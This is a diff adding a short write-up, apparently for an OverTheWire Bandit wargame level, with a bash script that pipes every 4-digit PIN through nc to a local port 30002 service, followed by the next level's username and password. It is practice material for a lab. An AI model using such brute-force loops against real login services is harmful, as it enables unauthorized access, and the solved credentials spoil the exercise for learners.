@@ -1,0 +1,28 @@
+mkdir /tmp/whatever
+nano script.sh
+
+// enter the following
+#!/bin/bash
+
+for i in {0..5000};
+do
+    echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"
+done | nc localhost 30002 > output1.txt
+
+for i in {5001..9999};
+do
+    echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"
+done | nc localhost 30002 > output2.txt
+
+// make executable
+chmod +x script.sh
+
+// read output
+
+cat output1.txt | grep -v "Try again."
+cat output2.txt | grep -v "Try again."
+
+// the reason for two loops is a timeout on nc
+
+username bandit25
+password uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
